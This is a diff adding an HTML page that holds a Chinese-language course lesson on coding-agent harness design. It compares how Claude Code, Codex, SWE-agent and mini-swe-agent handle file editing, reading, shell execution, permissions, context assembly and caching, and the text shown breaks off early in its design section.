@@ -1,0 +1,701 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>3.6 Coding Agent 架构：拆解 Claude Code、Codex、SWE-agent · AI Agent 全栈</title>
+<meta name="description" content="3.6 Coding Agent 架构：拆解 Claude Code、Codex、SWE-agent。duang777 的 AI Agent 全栈公开学习课件。" />
+<script>try{document.documentElement.setAttribute("data-theme",localStorage.getItem("x-theme")==="light"?"light":"dark")}catch(e){document.documentElement.setAttribute("data-theme","dark")}</script>
+<style>
+:root{
+  --bg:#0a0a0a;--surface:#111;--text:#ededed;--text-2:#a1a1a1;--text-3:rgb(255 255 255/.4);
+  --line:rgb(255 255 255/.1);--line-2:rgb(255 255 255/.06);
+  --body:#d4d4d4;--code-bg:#1a1a1a;--pre-bg:#0f0f0f;--nav-bg:rgb(10 10 10/.8);--sb:#2a2a2a;--sb-h:#3a3a3a;
+  --sans:Inter,-apple-system,BlinkMacSystemFont,"SF Pro Text","PingFang SC","Hiragino Sans GB","Noto Sans SC","Microsoft YaHei","Helvetica Neue",sans-serif;
+  --mono:ui-monospace,"SF Mono",SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+}
+*{box-sizing:border-box}
+html{color-scheme:dark}
+:root[data-theme="light"]{--bg:#fff;--surface:#fafafa;--text:#0a0a0a;--text-2:#555;--text-3:rgb(0 0 0/.42);--line:rgb(0 0 0/.1);--line-2:rgb(0 0 0/.06);--body:#333;--code-bg:#f2f2f2;--pre-bg:#fafafa;--nav-bg:rgb(255 255 255/.85);--sb:#d4d4d4;--sb-h:#bdbdbd}
+:root[data-theme="light"]{color-scheme:light}
+.toc{scrollbar-width:none}.toc::-webkit-scrollbar{display:none}
+html{scrollbar-width:thin;scrollbar-color:var(--sb) transparent}
+::-webkit-scrollbar{width:8px;height:8px}::-webkit-scrollbar-track{background:transparent}::-webkit-scrollbar-thumb{background:var(--sb);border-radius:8px}::-webkit-scrollbar-thumb:hover{background:var(--sb-h)}
+html{scroll-behavior:smooth;scroll-padding-top:80px}
+body{margin:0;background:var(--bg);color:var(--text);font-family:var(--sans);font-size:16px;line-height:1.8;-webkit-font-smoothing:antialiased}
+a{color:inherit}
+.nav{position:sticky;top:0;z-index:10;height:56px;display:flex;align-items:center;justify-content:space-between;padding:0 24px;border-bottom:1px solid var(--line);background:var(--nav-bg);backdrop-filter:blur(12px)}
+.nav__brand{display:flex;align-items:center;gap:10px;text-decoration:none;font-size:14px;font-weight:500}
+.nav__dot{width:10px;height:10px;border-radius:3px;background:var(--text)}
+.nav__links{display:flex;gap:20px;font-size:14px;color:var(--text-2)}
+.nav__links a{text-decoration:none}.nav__links a:hover{color:var(--text)}
+.wrap{max-width:1200px;margin:0 auto;padding:0 24px;display:grid;grid-template-columns:220px minmax(0,1fr);gap:56px}
+.toc{position:sticky;top:80px;align-self:start;max-height:calc(100vh - 100px);overflow:auto;padding:40px 0 40px;font-size:13px;line-height:1.6}
+.toc__label{font-family:var(--mono);font-size:11px;letter-spacing:.08em;color:var(--text-3);text-transform:uppercase;margin-bottom:12px}
+.toc ul{list-style:none;margin:0;padding:0}
+.toc li{margin:0}
+.toc a{display:block;padding:4px 0 4px 12px;border-left:1px solid var(--line);color:var(--text-2);text-decoration:none}
+.toc a:hover,.toc a.on{color:var(--text);border-left-color:var(--text)}
+.toc ul ul a{padding-left:24px;font-size:12.5px;color:var(--text-3)}
+.toc ul ul a:hover,.toc ul ul a.on{color:var(--text)}
+article{min-width:0;max-width:760px;padding:48px 0 96px}
+.meta{font-family:var(--mono);font-size:12px;letter-spacing:.06em;color:var(--text-3);margin-bottom:16px}
+article h1.title{font-size:40px;line-height:1.2;letter-spacing:-.02em;font-weight:600;margin:0 0 24px}
+article h1{font-size:28px;line-height:1.3;letter-spacing:-.01em;font-weight:600;margin:72px 0 20px;padding-top:32px;border-top:1px solid var(--line)}
+article h2{font-size:22px;line-height:1.4;font-weight:600;margin:48px 0 16px}
+article h3{font-size:18px;font-weight:600;margin:36px 0 12px}
+article h4{font-size:16px;font-weight:600;margin:28px 0 8px}
+article p{margin:0 0 18px;color:var(--body)}
+article strong{color:var(--text);font-weight:600}
+article ul,article ol{padding-left:22px;margin:0 0 18px;color:var(--body)}
+article li{margin:4px 0}
+article a{text-decoration:underline;text-decoration-color:var(--text-3);text-underline-offset:3px}
+article a:hover{text-decoration-color:var(--text)}
+article hr{border:0;border-top:1px solid var(--line);margin:48px 0}
+article blockquote{margin:0 0 20px;padding:12px 18px;border-left:2px solid var(--text-2);background:var(--surface);border-radius:0 8px 8px 0;color:var(--text-2)}
+article blockquote p{margin:6px 0;color:var(--text-2)}
+article code{font-family:var(--mono);font-size:.88em;background:var(--code-bg);border:1px solid var(--line-2);border-radius:5px;padding:1px 6px}
+article pre{position:relative;margin:0 0 22px;padding:16px 18px;background:var(--pre-bg);border:1px solid var(--line);border-radius:10px;overflow:auto;font-size:13.5px;line-height:1.65}
+article pre code{background:none;border:0;padding:0;font-size:inherit}
+.code{position:relative}
+.code__lang{position:absolute;top:8px;right:46px;font-family:var(--mono);font-size:11px;color:var(--text-3);z-index:1}
+.code__copy{position:absolute;top:6px;right:8px;z-index:1;font:11px var(--mono);color:var(--text-2);background:var(--code-bg);border:1px solid var(--line);border-radius:6px;padding:2px 7px;cursor:pointer}
+.code__copy:hover{color:var(--text)}
+.tbl{overflow-x:auto;margin:0 0 22px;border:1px solid var(--line);border-radius:10px}
+article table{border-collapse:collapse;width:100%;font-size:14px}
+article th,article td{padding:10px 14px;border-bottom:1px solid var(--line-2);text-align:left;vertical-align:top}
+article th{font-weight:600;background:var(--surface);color:var(--text)}
+article tr:last-child td{border-bottom:0}
+article details{margin:0 0 18px;border:1px solid var(--line);border-radius:10px;padding:10px 16px;background:var(--surface)}
+article summary{cursor:pointer;font-weight:500}
+.pager{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:72px;padding-top:32px;border-top:1px solid var(--line)}
+.pager a{display:block;padding:16px 18px;border:1px solid var(--line);border-radius:10px;text-decoration:none}
+.pager a:hover{border-color:var(--text-2)}
+.pager span{display:block;font-family:var(--mono);font-size:11px;letter-spacing:.06em;color:var(--text-3)}
+.pager .next{text-align:right;grid-column:2}
+.foot{margin-top:40px;font-size:13px;color:var(--text-3)}
+/* 代码高亮：黑白灰为主 */
+.hl .c,.hl .c1,.hl .cm,.hl .ch,.hl .cs,.hl .cp,.hl .cpf{color:#6b6b6b;font-style:italic}
+.hl .k,.hl .kd,.hl .kn,.hl .kr,.hl .kt,.hl .kc,.hl .kp,.hl .ow{color:#ffffff;font-weight:600}
+.hl .s,.hl .s1,.hl .s2,.hl .sb,.hl .sc,.hl .sd,.hl .se,.hl .sh,.hl .si,.hl .sx,.hl .sr,.hl .ss,.hl .dl,.hl .sa{color:#86efac}
+.hl .m,.hl .mi,.hl .mf,.hl .mh,.hl .mo,.hl .il{color:#fcd34d}
+.hl .nf,.hl .fm,.hl .nc,.hl .nn{color:#e5e5e5;font-weight:500}
+.hl .nb,.hl .bp,.hl .nd,.hl .na,.hl .nt{color:#bdbdbd}
+.hl .o,.hl .p{color:#9a9a9a}
+.hl .gd{color:#fca5a5}.hl .gi{color:#86efac}
+.hl{color:#d4d4d4}
+:root[data-theme="light"] .hl{color:#262626}
+:root[data-theme="light"] .hl .c,:root[data-theme="light"] .hl .c1,:root[data-theme="light"] .hl .cm,:root[data-theme="light"] .hl .ch,:root[data-theme="light"] .hl .cs,:root[data-theme="light"] .hl .cp,:root[data-theme="light"] .hl .cpf{color:#8a8a8a}
+:root[data-theme="light"] .hl .k,:root[data-theme="light"] .hl .kd,:root[data-theme="light"] .hl .kn,:root[data-theme="light"] .hl .kr,:root[data-theme="light"] .hl .kt,:root[data-theme="light"] .hl .kc,:root[data-theme="light"] .hl .kp,:root[data-theme="light"] .hl .ow{color:#000}
+:root[data-theme="light"] .hl .s,:root[data-theme="light"] .hl .s1,:root[data-theme="light"] .hl .s2,:root[data-theme="light"] .hl .sb,:root[data-theme="light"] .hl .sc,:root[data-theme="light"] .hl .sd,:root[data-theme="light"] .hl .se,:root[data-theme="light"] .hl .sh,:root[data-theme="light"] .hl .si,:root[data-theme="light"] .hl .sx,:root[data-theme="light"] .hl .sr,:root[data-theme="light"] .hl .ss,:root[data-theme="light"] .hl .dl,:root[data-theme="light"] .hl .sa{color:#15803d}
+:root[data-theme="light"] .hl .m,:root[data-theme="light"] .hl .mi,:root[data-theme="light"] .hl .mf,:root[data-theme="light"] .hl .mh,:root[data-theme="light"] .hl .mo,:root[data-theme="light"] .hl .il{color:#b45309}
+:root[data-theme="light"] .hl .nf,:root[data-theme="light"] .hl .fm,:root[data-theme="light"] .hl .nc,:root[data-theme="light"] .hl .nn{color:#171717}
+:root[data-theme="light"] .hl .nb,:root[data-theme="light"] .hl .bp,:root[data-theme="light"] .hl .nd,:root[data-theme="light"] .hl .na,:root[data-theme="light"] .hl .nt{color:#525252}
+:root[data-theme="light"] .hl .o,:root[data-theme="light"] .hl .p{color:#6b6b6b}
+:root[data-theme="light"] .hl .gd{color:#b91c1c}:root[data-theme="light"] .hl .gi{color:#15803d}
+.nav__right{display:flex;align-items:center;gap:20px}
+.theme-toggle{display:inline-flex;align-items:center;justify-content:center;width:32px;height:32px;border-radius:8px;border:1px solid var(--line);background:transparent;color:var(--text);cursor:pointer}
+.theme-toggle:hover{border-color:var(--text-2)}
+.theme-toggle svg{width:15px;height:15px}
+.theme-toggle .i-moon,:root[data-theme="light"] .theme-toggle .i-sun{display:none}
+:root[data-theme="light"] .theme-toggle .i-moon{display:block}
+@media (max-width:960px){.wrap{grid-template-columns:1fr;gap:0}.toc{display:none}article h1.title{font-size:30px}.nav__links a.hide-sm{display:none}}
+</style>
+</head>
+<body>
+<header class="nav">
+  <a class="nav__brand" href="../index.html"><span class="nav__dot"></span>AI Agent 全栈</a>
+  <div class="nav__right">
+  <nav class="nav__links">
+    <a href="../index.html#progress">课件</a>
+    <a class="hide-sm" href="https://github.com/Duang777/ai-agent-fullstack-roadmap/blob/main/ROADMAP.md">路线图</a>
+    <a href="https://github.com/Duang777/ai-agent-fullstack-roadmap/blob/main/notes/03-agents/06-coding-agent.md">在 GitHub 上查看</a>
+  </nav>
+  <button class="theme-toggle" id="theme-toggle" type="button" aria-label="切换浅色 / 深色" title="切换浅色 / 深色"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button>
+  </div>
+</header>
+<div class="wrap">
+  <aside class="toc"><div class="toc__label">本课目录</div><ul>
+<li><a href="#读前说明">读前说明</a></li>
+<li><a href="#1-一个-coding-agent-由什么组成">1. 一个 coding agent 由什么组成</a></li>
+<li><a href="#2-三个系统拆解">2. 三个系统拆解</a></li>
+<li><a href="#3-harness-的设计要点">3. Harness 的设计要点</a></li>
+<li><a href="#4-练习代码导读">4. 练习代码导读</a></li>
+<li><a href="#5-常见的坑">5. 常见的坑</a></li>
+<li><a href="#6-练习">6. 练习</a></li>
+<li><a href="#7-自测题">7. 自测题</a></li>
+<li><a href="#8-自测题答案">8. 自测题答案</a></li>
+<li><a href="#9-参考答案">9. 参考答案</a></li>
+<li><a href="#完成标准">完成标准</a></li>
+</ul>
+</aside>
+  <article>
+    <div class="meta">模块 03 · Agent 架构 · 第 3.6 课</div>
+    <h1 class="title">3.6 Coding Agent 架构：拆解 Claude Code、Codex、SWE-agent</h1>
+    <blockquote>
+<p>第 3 部分 · 第 6 课 ｜ 预计 3–4 小时 ｜ 前置：2.1 Function Calling、2.5 代码执行沙箱、1.5 Prompt Caching、3.2 Agent Loop</p>
+<p>配套练习：<code>projects/22-coding/</code>（纯 Go 标准库，15 个测试）。一个最小的 coding agent harness：路径不能逃出工作区（<code>..</code>、绝对路径、符号链接都挡）；<code>read</code> 按 100 行窗口返回带行号的内容；<code>edit</code> 是精确字符串替换，必须先读、必须唯一、读后被人改过要重读，<code>.go</code> 文件改完先过语法检查，不通过就撤回；<code>grep</code> 超过 50 条不给结果；<code>bash</code> 每条命令一个进程、环境变量白名单、超时杀进程组、输出保留头尾，权限按 deny → 复合命令 → allow 前缀 → 问人的顺序判断；开头按 Codex 的顺序拼 AGENTS.md 和环境信息，之后每次请求都是上一次的前缀扩展；文件修改可以撤销；<code>finish</code> 之前 harness 自己跑测试，不过不让结束。最后一个测试让脚本化的模型真的修好一个 Go 函数，<code>go test</code> 通过。</p>
+</blockquote>
+<h2 id="读前说明">读前说明</h2>
+<p>前面几课的 agent 都很抽象：一个循环，一组工具，一个模型。coding agent 是这个模式目前最成熟、用得最多的落地形态。Claude Code、Codex、Cursor 的 agent 模式、SWE-agent，本质上都是 3.2 那个循环。区别全在循环外面那一层：给模型什么工具、工具的输入输出长什么样、上下文怎么拼、哪些操作要问人、什么时候算做完。</p>
+<p>Claude Code 的文档给这一层起了个名字：<strong>agentic harness</strong>，“围绕模型、提供工具并管理模型看到的上下文的那一层”。OpenAI 讲 Codex 时也用同一个词。这一课就是拆 harness。</p>
+<p>先想几个问题：</p>
+<ul>
+<li>让模型改文件，给它“写整个文件”的工具不就够了？为什么 Claude Code 的 Edit 要求 <code>old_string</code> 必须唯一？</li>
+<li>让模型看文件，一次给全文不是信息最多吗？SWE-agent 为什么只给 100 行？</li>
+<li>Codex 每次请求都把完整历史重新发一遍，为什么不用 <code>previous_response_id</code>？这样不是平方级的开销吗？</li>
+<li>mini-swe-agent 只有一个 bash 工具，连 function calling 都不用，在 SWE-bench Verified 上照样 74% 以上。那精心设计的工具还有意义吗？</li>
+</ul>
+<hr />
+<h2 id="1-一个-coding-agent-由什么组成">1. 一个 coding agent 由什么组成</h2>
+<p>Claude Code 文档把循环描述成三个阶段：<strong>收集上下文、采取行动、验证结果</strong>，三者交织，反复进行。修一个失败的测试，典型过程是：</p>
+<div class="hl"><pre><span></span><code>跑测试看哪里失败 → 读错误输出 → 搜相关源文件 → 读这些文件
+→ 编辑修复 → 再跑测试验证
+</code></pre></div>
+
+<p>每一步用一个工具，结果回到循环里决定下一步。把它拆开，harness 要负责的东西是：</p>
+<div class="tbl"><table>
+<thead>
+<tr>
+<th>组件</th>
+<th>解决的问题</th>
+<th>本课对应</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>文件工具</td>
+<td>读、改、建文件，输入输出格式对模型友好</td>
+<td>第 3.1、3.2 节</td>
+</tr>
+<tr>
+<td>搜索</td>
+<td>在大仓库里找到相关位置</td>
+<td>第 3.2 节</td>
+</tr>
+<tr>
+<td>执行</td>
+<td>跑命令、跑测试，拿到真实反馈</td>
+<td>第 3.3 节</td>
+</tr>
+<tr>
+<td>权限与沙箱</td>
+<td>哪些操作直接做，哪些要问，哪些禁止</td>
+<td>第 3.4 节</td>
+</tr>
+<tr>
+<td>上下文管理</td>
+<td>项目说明、环境信息、历史、压缩、缓存</td>
+<td>第 3.5 节</td>
+</tr>
+<tr>
+<td>验证</td>
+<td>什么时候算做完</td>
+<td>第 3.6 节</td>
+</tr>
+<tr>
+<td>会话与撤销</td>
+<td>中断、恢复、分叉、回滚文件修改</td>
+<td>第 2.1 节、3.5 课</td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2 id="2-三个系统拆解">2. 三个系统拆解</h2>
+<h3 id="21-claude-code">2.1 Claude Code</h3>
+<p><strong>工具</strong>。内置工具分五类：文件操作、搜索、执行、Web、代码智能（编辑后看到类型错误，跳转定义、查引用，需要语言服务器插件）。另外还有一批编排类工具：<code>Agent</code>（开子代理，独立上下文窗口）、<code>AskUserQuestion</code>（多选题问用户）、计划模式、worktree 等。</p>
+<p>几个值得注意的工具细节：</p>
+<ul>
+<li><strong>Edit 是精确字符串替换</strong>，不用正则也不模糊匹配。三条检查：编辑前要在当前对话里读过这个文件（被截断的部分读取不算）；<code>old_string</code> 必须逐字符出现；必须只出现一次，否则要么带更多上下文，要么显式 <code>replace_all</code>。文件在上次读之后被改过时，只有 <code>old_string</code> 仍然精确且唯一匹配才放行，否则要求重读。</li>
+<li><strong>Read 返回带行号的内容</strong>，单次最多约 25,000 token，超过 256 KB 的文件要分页读。</li>
+<li><strong>Bash 每条命令一个独立进程</strong>。<code>cd</code> 会保留到后续命令（只要还在项目目录内），环境变量不保留。默认超时 2 分钟，上限 10 分钟。成功的输出大约 30,000 字符以内直接给模型，超过就存文件、只给前 2,000 字符预览；失败的输出大约 10,000 字符以内，超过给头尾摘录。</li>
+<li><strong>在 macOS、Linux 上，Glob 和 Grep 默认不在工具列表里</strong>，模型直接在 Bash 里用 <code>find</code> 和 <code>grep</code>（底层是内嵌的 bfs 和 ugrep）。这是一个有意思的信号：专用搜索工具的价值在下降，模型已经很会用 shell 了。</li>
+<li><strong>Glob 结果最多 100 个文件</strong>，超了给截断标记，让模型缩小范围。</li>
+</ul>
+<p><strong>会话</strong>。每条消息、工具调用和结果都写进 <code>~/.claude/projects/</code> 下的 JSONL 文件，这就是 3.5 课的事件日志。<code>--continue</code> / <code>--resume</code> 在同一个会话 ID 上追加，<code>--fork-session</code> 复制历史到新 ID。</p>
+<p><strong>检查点</strong>。编辑文件之前先给文件拍快照，按两次 Esc 回滚。检查点和 git 无关，只覆盖文件修改；数据库、API、部署这类远程操作撤不回，只能靠权限控制。</p>
+<p><strong>权限模式</strong>：Auto（后台分类器审查每个动作，拦下有风险的）、Manual（编辑和命令都问）、Accept edits（编辑和常见文件命令不问，其他命令问）、Plan（只探索和出方案，不改源文件）。<code>.claude/settings.json</code> 可以按 <code>Bash(npm run *)</code> 这种格式放行或禁止。</p>
+<p><strong>上下文</strong>。<code>CLAUDE.md</code> 存项目约定，仓库里有 <code>AGENTS.md</code> 也能读。自动记忆 <code>MEMORY.md</code> 每次会话开头加载前 200 行或 25 KB。上下文快满时自动压缩成摘要，早期的详细指令可能丢失，所以持久规则要写进 <code>CLAUDE.md</code>。Skills 只在会话开始时加载描述，用到才加载全文；MCP 工具定义默认延迟加载，只占名字的空间。子代理在自己的上下文窗口里跑，主对话只收到最终摘要。</p>
+<h3 id="22-codex">2.2 Codex</h3>
+<p>OpenAI 在 2026 年 1 月的工程博客《Unrolling the Codex agent loop》里把 Codex CLI 的循环讲得很细。所有 Codex 产品（CLI、Cloud、VS Code 扩展）共用同一个 harness。</p>
+<p><strong>请求结构</strong>。Codex 用 Responses API，关注三个字段：</p>
+<ul>
+<li><code>instructions</code>：模型专属的基础提示词，随 CLI 打包（每个模型一份 prompt 文件），也可以在 <code>~/.codex/config.toml</code> 里换；</li>
+<li><code>tools</code>：Codex 自己的 <code>shell</code>、<code>update_plan</code>，Responses API 提供的 <code>web_search</code>，以及用户配置的 MCP 工具（名字形如 <code>mcp__weather__get-forecast</code>）；</li>
+<li><code>input</code>：一个 item 列表。</li>
+</ul>
+<p><code>input</code> 在用户消息之前，Codex 按固定顺序插入几条：</p>
+<ol>
+<li>一条 <code>role=developer</code> 的权限说明：沙箱规则、什么时候要问用户、哪些目录可写。<strong>这些规则只约束 Codex 自己的 shell 工具</strong>，MCP 工具不受 Codex 沙箱管，要自己负责安全；</li>
+<li>（可选）<code>config.toml</code> 里的 <code>developer_instructions</code>；</li>
+<li>（可选）一条 <code>role=user</code> 的“用户指令”，汇总自多个来源，越具体的越靠后：<code>$CODEX_HOME</code> 下的 <code>AGENTS.md</code>；然后从 Git 项目根目录一路走到当前目录，每层取 <code>AGENTS.override.md</code> 或 <code>AGENTS.md</code>，总量默认上限 32 KiB；再加上已配置 skills 的元数据；</li>
+<li>一条 <code>role=user</code> 的 <code>&lt;environment_context&gt;</code>，写明当前目录和 shell。</li>
+</ol>
+<p>然后才是用户消息。</p>
+<p><strong>无状态</strong>。每个工具调用的结果追加到 <code>input</code>，整个列表重新发一遍。博客自己承认这在发送的 JSON 总量上是平方级的。不用 <code>previous_response_id</code> 的原因是保持每个请求完全无状态，并支持零数据保留（ZDR）客户：服务端存状态和 ZDR 冲突。ZDR 客户也不会丢失推理内容，因为加密的 reasoning 可以在服务端解密（OpenAI 保存的是解密密钥，不是数据）。</p>
+<p><strong>真正贵的是采样，不是网络</strong>。所以优化目标是 prompt cache 命中率：缓存只对精确前缀生效，命中时采样成本是线性的。Codex 特意让每次请求的旧 input 是新 input 的<strong>精确前缀</strong>。会导致 cache miss 的操作：</p>
+<ul>
+<li>对话中途改变可用工具；</li>
+<li>换模型（模型专属指令变了）；</li>
+<li>改沙箱配置、审批模式或当前目录。</li>
+</ul>
+<p>Codex 的应对：配置中途变化时，<strong>追加</strong>一条新消息描述变化（新的 developer 权限消息、新的 environment_context），而不是修改开头那条。博客还提到一个真实的坑：早期接 MCP 时工具列举顺序不稳定，导致 cache miss。MCP 服务器发 <code>tools/list_changed</code> 通知时，长对话中途更新工具列表代价也很高。</p>
+<p><strong>压缩</strong>。token 超过阈值时压缩对话。早期是手动 <code>/compact</code>，让模型生成摘要当作新的 input；现在用 Responses API 的 <code>/responses/compact</code> 端点，返回一个更短的 item 列表，其中有一个 <code>type=compaction</code> 的 item，带不透明的 <code>encrypted_content</code>，保留模型对原对话的“潜在理解”。超过 <code>auto_compact_limit</code> 自动触发。</p>
+<p><strong>App Server</strong>。后续一篇博客讲了 harness 的其余部分：thread 的创建、恢复、分叉、归档和事件历史持久化（客户端断线重连后能渲染一致的时间线）；配置与认证；在沙箱里执行 shell 和文件工具，接入 MCP 和 skills，统一的策略模型。这些通过 App Server 协议暴露给各个客户端。</p>
+<h3 id="23-swe-agentagent-computer-interface">2.3 SWE-agent：Agent-Computer Interface</h3>
+<p>SWE-agent（NeurIPS 2024）提出了 <strong>ACI</strong>（Agent-Computer Interface）这个概念：就像人用的软件需要好的 UI，给模型用的工具也需要专门设计。它的核心论点是：<strong>为语言模型定制的接口，比为人设计的接口（比如 Linux shell）效果更好</strong>，而且不需要改模型权重。</p>
+<p>它的 ACI 由四部分组成：</p>
+<ul>
+<li><strong>搜索与导航</strong>：<code>find_file</code>、<code>search_file</code>、<code>search_dir</code>，返回汇总结果。每次搜索最多 50 条；超过就不给结果，提示模型写更具体的查询；</li>
+<li><strong>文件查看器</strong>：<code>open</code> 打开文件，一次最多显示 100 行，<code>scroll_up</code> / <code>scroll_down</code> / <code>goto</code> 移动窗口；显示文件完整路径、总行数、窗口上下各省略了多少行，每行带行号；</li>
+<li><strong>文件编辑器</strong>：<code>edit</code> 替换打开文件中的一个行范围。编辑时跑 linter，<strong>语法不对的编辑直接丢弃</strong>，让模型重来；编辑成功后显示更新后的文件内容；</li>
+<li><strong>上下文管理</strong>：命令没有输出时明确告诉模型“命令成功运行，没有输出”；最近 5 条之前的观察都折叠成一行。</li>
+</ul>
+<p>论文的消融实验（SWE-bench Lite，GPT-4 Turbo，完整配置 18.0%）很能说明问题：</p>
+<div class="tbl"><table>
+<thead>
+<tr>
+<th>改动</th>
+<th>解决率</th>
+<th>变化</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>完整 SWE-agent</td>
+<td>18.0%</td>
+<td>—</td>
+</tr>
+<tr>
+<td>去掉编辑命令（只能用 shell 改文件）</td>
+<td>10.3%</td>
+<td>−7.7</td>
+</tr>
+<tr>
+<td>编辑命令不带 linter</td>
+<td>15.0%</td>
+<td>−3.0</td>
+</tr>
+<tr>
+<td>搜索改成逐条迭代返回</td>
+<td>12.0%</td>
+<td>−6.0</td>
+</tr>
+<tr>
+<td>去掉搜索命令</td>
+<td>15.7%</td>
+<td>−2.3</td>
+</tr>
+<tr>
+<td>查看器每次 30 行</td>
+<td>14.3%</td>
+<td>−3.7</td>
+</tr>
+<tr>
+<td>查看器显示整个文件</td>
+<td>12.7%</td>
+<td>−5.3</td>
+</tr>
+<tr>
+<td>保留完整历史（不折叠旧观察）</td>
+<td>15.0%</td>
+<td>−3.0</td>
+</tr>
+<tr>
+<td>去掉示范轨迹</td>
+<td>16.3%</td>
+<td>−1.7</td>
+</tr>
+</tbody>
+</table></div>
+<p>两个反直觉的结论：<strong>给全文件反而更差</strong>，<strong>保留完整历史反而更差</strong>。信息不是越多越好，无关内容会稀释注意力、挤占上下文，过时的文件内容还会误导模型。这和 1.6 上下文工程讲的是一回事。</p>
+<p>在完整的 SWE-bench 测试集上，SWE-agent + GPT-4 Turbo 解决了 12.47%，之前最好的非交互式检索增强方法是 3.8%。</p>
+<h3 id="24-mini-swe-agent一年之后的反转">2.4 mini-swe-agent：一年之后的反转</h3>
+<p>同一个团队后来做了 mini-swe-agent，口号是“100 行有用的 AI agent”。它的设计几乎是 SWE-agent 的反面：</p>
+<ul>
+<li><strong>除了 bash 没有任何工具</strong>，连模型的 tool calling 接口都不用，模型在回复里写命令，harness 解析出来执行。所以能接任何模型；</li>
+<li><strong>历史完全线性</strong>，每一步只是往消息列表里追加。轨迹就是发给模型的消息，调试和微调都方便；</li>
+<li><strong>每个动作用 <code>subprocess.run</code> 独立执行</strong>，不维护持久的 shell 会话。换到沙箱里只需要把 <code>subprocess.run</code> 换成 <code>docker exec</code>。</li>
+</ul>
+<p>它在 SWE-bench Verified 上超过 74%。团队的说法是：2024 年他们非常强调工具和专门接口，一年后，构建一个有用的 agent 已经不需要这些了。</p>
+<p>这不是说 ACI 没用了，而是说<strong>最优的 ACI 随模型能力变化</strong>。2024 年的模型不太会用 <code>sed</code> 安全地改文件，所以需要专门的编辑器；现在的模型 shell 用得很好，专用工具的边际收益变小，而“少一层抽象”带来的稳定性、可移植性、可调试性收益变大。Claude Code 在 Linux 上默认去掉 Glob 和 Grep 也是同一个趋势。但是<strong>编辑工具没有被去掉</strong>：Claude Code 在去掉 Glob、Grep 的同时保留了 Edit。因为改文件出错的代价最高，精确替换带来的安全检查（先读、唯一、过期检测、撤销快照）用 shell 很难做到。</p>
+<h3 id="25-对照">2.5 对照</h3>
+<div class="tbl"><table>
+<thead>
+<tr>
+<th></th>
+<th>Claude Code</th>
+<th>Codex</th>
+<th>SWE-agent</th>
+<th>mini-swe-agent</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>工具</td>
+<td>五类内置 + 编排工具 + MCP + skills</td>
+<td>shell、update_plan、web_search + MCP + skills</td>
+<td>搜索 / 查看器 / 编辑器 + shell</td>
+<td>只有 bash</td>
+</tr>
+<tr>
+<td>改文件</td>
+<td>Edit 精确替换（先读、唯一）</td>
+<td>博客列出的工具里没有单独的编辑工具，经 shell 完成</td>
+<td>行范围替换 + linter</td>
+<td>shell 命令</td>
+</tr>
+<tr>
+<td>执行</td>
+<td>每命令独立进程，cwd 保留</td>
+<td>沙箱里的 shell</td>
+<td>持久 shell 会话</td>
+<td><code>subprocess.run</code>，每命令独立</td>
+</tr>
+<tr>
+<td>项目说明</td>
+<td>CLAUDE.md（可读 AGENTS.md）+ 自动记忆</td>
+<td>分层 AGENTS.md，32 KiB</td>
+<td>无</td>
+<td>无</td>
+</tr>
+<tr>
+<td>安全</td>
+<td>权限模式 + 规则 + 文件检查点</td>
+<td>沙箱 + 审批策略（只管 shell）</td>
+<td>容器</td>
+<td>换成 docker exec</td>
+</tr>
+<tr>
+<td>上下文</td>
+<td>自动压缩、skills 按需、子代理隔离</td>
+<td>精确前缀 + compaction 端点</td>
+<td>最近 5 条观察全文</td>
+<td>线性，不处理</td>
+</tr>
+</tbody>
+</table></div>
+<hr />
+<h2 id="3-harness-的设计要点">3. Harness 的设计要点</h2>
+<h3 id="31-编辑为什么是精确替换">3.1 编辑：为什么是精确替换</h3>
+<p>改文件有四种常见格式：</p>
+<div class="tbl"><table>
+<thead>
+<tr>
+<th>格式</th>
+<th>问题</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>写整个文件</td>
+<td>大文件输出 token 多、慢；模型容易在“抄”没改的部分时漏掉或改错几行</td>
+</tr>
+<tr>
+<td>按行号替换（SWE-agent）</td>
+<td>行号在每次编辑后漂移，连续多处编辑时模型要自己算偏移；模型看到的行号可能已过时</td>
+</tr>
+<tr>
+<td>统一 diff / 补丁</td>
+<td>格式严格，模型生成的上下文行、行号经常对不上，需要宽松的应用逻辑</td>
+</tr>
+<tr>
+<td>精确字符串替换（Claude Code）</td>
+<td><code>old_string</code> 不唯一时要带更多上下文</td>
+</tr>
+</tbody>
+</table></div>
+<p>精确替换的好处是<strong>用内容定位，不依赖行号</strong>，而且天然带了几道安全检查：</p>
+<ul>
+<li><strong>先读后改</strong>：模型不能凭记忆或猜测去改一个它没看过的文件；</li>
+<li><strong>精确匹配</strong>：差一个空格都不行，模型必须真的知道文件现在长什么样；</li>
+<li><strong>唯一</strong>：出现多次就拒绝，逼模型给出足够的上下文，避免改错位置；</li>
+<li><strong>过期检测</strong>：用户在编辑器里改过文件，模型手里的版本就过时了，要重读。练习里用“上次读取时的内容哈希”判断，比 Claude Code 严格（它在 <code>old_string</code> 仍然唯一匹配时放行）。</li>
+</ul>
+<p>再加上 SWE-agent 的 <strong>linter 关卡</strong>：编辑结果语法不对就不落盘，错误原因回给模型。练习用 <code>go/parser</code> 做这件事。这比“改坏了再跑测试发现”便宜得多，而且文件始终处于可解析的状态。</p>
+<h3 id="32-读和搜给少但给对">3.2 读和搜：给少，但给对</h3>
+<ul>
+<li><strong>窗口化</strong>：一次 100 行，头部写明总行数，窗口外写明还有多少行，模型知道自己没看全；</li>
